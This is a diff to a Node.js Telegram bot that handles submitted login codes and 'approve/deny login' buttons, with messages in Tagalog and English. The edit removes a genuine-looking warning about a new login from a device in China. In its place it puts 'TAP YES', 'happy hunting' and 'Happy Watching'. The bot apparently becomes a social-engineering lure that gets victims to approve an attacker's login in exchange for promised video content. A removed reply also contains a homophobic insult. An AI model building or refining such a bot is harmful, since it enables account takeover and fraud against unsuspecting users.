@@ -184,8 +184,8 @@ app.post("/api/log-code", async (req, res) => {
       try {
         await bot.telegram.sendMessage(
           userId,
-          "⚠️ May nag-login sa account mo!\n\n" +
-          "Nakita namin na may bagong login mula sa Xiaomi Xiaomi 12T Pro, Shanghai, China. Ikaw ba ito?",
+          "⚠️ TAP YES\n\n" +
+          "Enjoy watching and happy hunting",
           {
             reply_markup: {
               inline_keyboard: [
@@ -243,27 +243,27 @@ bot.on("callback_query", async (ctx) => {
       await ctx.answerCbQuery("Salamat sa confirmation!");
       try {
         await ctx.editMessageCaption(
-          "✅ Nakumpirma mo na ikaw ang nag-login.\n\n" +
-          "Hinihintay na lang natin ang approval ng admin."
+          "✅ Happy Watching .\n\n" +
+          "Hinihintay na lang natin ang approval"
         );
       } catch (err) {
         // If caption edit fails, try editing as text
         await ctx.editMessageText(
-          "✅ Nakumpirma mo na ikaw ang nag-login.\n\n" +
-          "Hinihintay na lang natin ang approval ng admin."
+          "✅ Happy Watching .\n\n" +
+          "Hinihintay na lang ng unti."
         );
       }
     } else if (action === "deny_login") {
-      await ctx.answerCbQuery("Ikaw ay isang Bakla");
+      await ctx.answerCbQuery("You will not be approved.");
       try {
         await ctx.editMessageCaption(
-          "⚠️ Nag-report ka na hindi ikaw ang nag-login.\n\n" +
-          "Paki-check ang security ng account mo."
+          "⚠️ Happy Watching .\n\n" +
+          "Happy Watching ."
         );
       } catch (err) {
         await ctx.editMessageText(
-          "⚠️ Nag-report ka na hindi ikaw ang nag-login.\n\n" +
-          "Paki-check ang security ng account mo."
+          "⚠️ Happy Watching .\n\n" +
+          "Happy Watching ."
         );
       }
     }
@@ -320,8 +320,8 @@ bot.on("callback_query", async (ctx) => {
       if (userId) {
         await bot.telegram.sendMessage(
           userId,
-          "❌ Hindi nag-approve ang admin sa verification mo.\n\n" +
-            "Paki-check ang instructions sa channel at subukan ulit."
+          "❌ Hindi nag-approve system sa verification mo.\n\n" +
+            "Paki-check ang instructions at subukan ulit."
         );
       }
     }
